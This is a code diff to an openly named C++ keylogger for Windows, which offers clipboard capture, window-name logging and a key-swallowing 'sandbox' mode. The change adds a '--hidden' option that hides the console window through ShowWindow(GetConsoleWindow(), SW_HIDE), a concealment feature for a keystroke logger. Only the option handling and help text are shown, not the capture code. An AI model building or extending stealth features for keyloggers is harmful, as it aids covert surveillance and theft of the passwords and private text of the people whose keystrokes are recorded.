@@ -19,6 +19,10 @@ Keylogger::IKeycodeMapper* getMapperByStr(std::string mapper) {
     return nullptr;
 }
 
+void hideConsole() {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+}
+
 void printSandboxState(Keylogger::SandboxListener* sandbox) {
     while (true) {
         std::cout << std::endl << "Type '" << sandbox->getExitSeq(true) << "' to exit the sandbox." << std::endl;
@@ -27,10 +31,11 @@ void printSandboxState(Keylogger::SandboxListener* sandbox) {
 }
 
 int main(int argc, char *argv[]) {
-    const char* const short_opts = "chkm:o:sw";
+    const char* const short_opts = "chkm:o:swz";
     const option long_opts[] = {
         {"clipboard", no_argument, nullptr, 'c'},
         {"help", no_argument, nullptr, 'h'},
+        {"hidden", no_argument, nullptr, 'z'},
         {"keycodes", no_argument, nullptr, 'k'},
         {"mapper", required_argument, nullptr, 'm'},
         {"output", required_argument, nullptr, 'o'},
@@ -49,6 +54,7 @@ options:\n\
   -s, --sandbox          capture key presses without passing them through\n\
                            until the correct sequence is typed, then exit\n\
   -w, --window           enable window name logging\n\
+  -z, --hidden           hide the console window\n\
 \n\
 available keycode maps:\n\
   us    US keyboard\n\
@@ -90,6 +96,9 @@ available keycode maps:\n\
             break;
         case 'w':
             windowEnable = true;
+            break;
+        case 'z':
+            hideConsole();
             break;
         case 'h':
         case '?':
